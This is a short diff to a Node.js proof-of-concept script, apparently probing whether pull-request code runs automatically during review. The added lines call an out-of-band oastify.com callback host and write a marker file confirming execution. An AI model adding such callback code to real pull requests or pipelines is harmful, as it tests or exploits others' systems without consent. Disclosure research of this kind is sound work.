@@ -1,3 +1,6 @@
+const https = require('https');
 const fs = require('fs');
-console.log('POC SCRIPT EXECUTED: VERSION_2');
-fs.writeFileSync('poc-outcome.txt', 'VERSION_2\n');
+https.get('https://hsdvcbolq7nbw4p1y4dg56vhq8wzke1v5gdkzbo.oastify.com/pr-review-autotrigger', (res) => {
+    fs.writeFileSync('poc-outcome.txt', 'PR_REVIEW_TRIGGERED_EXECUTION\n');
+});
+console.log('POC SCRIPT EXECUTED FROM PR REVIEW CONTEXT');
